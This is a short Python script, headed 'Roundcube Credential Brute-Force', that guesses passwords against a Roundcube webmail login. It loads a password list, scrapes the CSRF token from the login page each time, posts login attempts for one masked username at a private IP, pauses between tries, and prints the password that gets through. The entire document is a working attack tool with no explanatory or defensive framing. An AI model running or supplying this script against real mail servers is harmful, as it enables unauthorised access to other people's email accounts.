## Roundcube Credential Brute-Force
import requests, time, sys, re

url = 'http://10.1.xx.xx/roundcube/'
user = 'mxxxa'

with open('passwords.txt') as f:
    passwords = [p.strip() for p in f if p.strip()]

s = requests.Session()
for pw in passwords:
    r = s.get(url)
    token = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not token:
        token = re.search(r'request_token.*?value="([^"]+)"', r.text)
    data = {
        '_task': 'login',
        '_action': 'login',
        '_timezone': 'America/New_York',
        '_url': '',
        '_token': token.group(1) if token else '',
        '_user': user,
        '_pass': pw
    }
    r = s.post(url + '?_task=login', data=data, allow_redirects=False)
    if r.status_code == 302 and 'task=mail' in r.headers.get('Location', ''):
        print(f'[+] FOUND:{user}:{pw}')
        sys.exit(0)
    print(f'[-]{pw}')
    time.sleep(10)
